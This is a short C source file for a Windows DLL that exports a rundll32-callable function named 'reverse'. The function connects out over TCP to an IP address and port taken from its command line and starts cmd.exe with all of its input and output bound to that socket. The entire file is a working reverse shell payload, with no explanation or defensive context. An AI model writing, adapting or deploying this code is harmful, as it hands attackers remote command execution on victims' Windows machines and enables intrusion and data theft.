#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")

extern __declspec(dllexport) void __cdecl reverse(HWND hwnd, HINSTANCE hinst, LPSTR lpCmdLine, int nCmdShow)
{
    char* ip_addr, * port;
    ip_addr = strtok(lpCmdLine, ":");
    port = strtok(NULL, ":");
    if (ip_addr == NULL || port == NULL)
    {
        return;
    }
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(atoi(port));
    if (WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL))
    {
        return;
    }
    STARTUPINFO si = {};
    PROCESS_INFORMATION pi;
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    TCHAR cmd[255] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}
